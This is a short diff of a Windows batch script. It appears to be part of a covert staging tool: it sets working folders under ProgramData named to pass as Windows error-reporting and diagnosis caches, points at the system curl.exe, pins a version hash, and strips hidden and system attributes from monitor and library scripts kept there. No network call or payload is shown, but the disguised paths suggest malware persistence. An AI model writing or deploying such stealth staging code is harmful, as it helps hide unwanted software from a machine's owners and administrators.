@@ -4,7 +4,7 @@ setlocal
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
 set "CURL=%SystemRoot%\System32\curl.exe"
-set "PIN=PENDING"
+set "PIN=455d4b9"
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
 attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
